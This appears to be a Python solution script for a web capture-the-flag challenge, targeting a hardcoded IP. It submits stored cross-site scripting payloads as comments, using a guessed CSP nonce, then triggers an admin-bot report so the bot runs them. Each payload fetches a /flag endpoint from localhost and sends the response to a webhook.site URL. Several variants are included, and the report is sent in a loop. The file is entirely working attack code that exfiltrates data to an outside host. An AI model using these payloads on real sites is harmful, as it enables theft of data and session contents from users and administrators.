import requests

url = 'http://20.198.106.95:16050/'

def report_comment(comment):
    r = requests.post(url + 'comment', data={'name': 'haxx', 'comment': comment})
    print(r.text)
    new_id = r.url.split('/')[-1]
    print(new_id)
    p = requests.post(url + 'report', data={"id":new_id})
    print(p.text)

myurl = 'https://webhook.site/2050cf9b-b820-4dc5-a165-24b48ab36146'

payload = '''<script nonce='7'>let xmlHttp = new XMLHttpRequest(); xmlHttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        document.location='https://webhook.site/2050cf9b-b820-4dc5-a165-24b48ab36146?c1='+xmlHttp.responseText;
    }
};  xmlHttp.open("GET", "http://127.0.0.1:16050/flag", true);xmlHttp.send(null);'''

# payload = '''<script nonce='7'>var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", "http://127.0.0.1:16050/flag");xmlHttp.send(null); document.location='https://webhook.site/2050cf9b-b820-4dc5-a165-24b48ab36146?c1='+xmlHttp.responseText</script>'''

'''
<script nonce='8'>let xmlHttp = new XMLHttpRequest(); xmlHttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.location='https://webhook.site/2050cf9b-b820-4dc5-a165-24b48ab36146?c1='+encodeURI(xmlHttp.responseText); } };  xmlHttp.open("GET", "http://20.198.106.95:16050/flag", false);xmlHttp.send(null);</script>

<script nonce='8'>let xmlHttp = new XMLHttpRequest(); xmlHttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { var x = new XMLHttpRequest();x.open("GET", 'https://webhook.site/2050cf9b-b820-4dc5-a165-24b48ab36146?c1='+encodeURI(xmlHttp.responseText), false); x.send(); } };  xmlHttp.open("GET", "http://0.0.0.0:16050/flag", true);xmlHttp.send(null);</script>

'''

payload = '''<script nonce='8'>let xmlHttp = new XMLHttpRequest(); xmlHttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.location='https://webhook.site/2050cf9b-b820-4dc5-a165-24b48ab36146?c1='+ encodeURI(xmlHttp.responseText); } };  xmlHttp.open("GET", "http://0.0.0.0:16050/flag", true);xmlHttp.send(null);</script>'''

payload = '''<script nonce='8'>let xmlHttp = new XMLHttpRequest(); xmlHttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { var x = new XMLHttpRequest();x.open("GET", 'https://webhook.site/2050cf9b-b820-4dc5-a165-24b48ab36146?c1='+encodeURI(xmlHttp.responseText), false); x.send(); } };  xmlHttp.open("GET", "http://0.0.0.0:16050/flag", true);xmlHttp.send(null);</script>'''

for i in range(10):
    report_comment(payload)
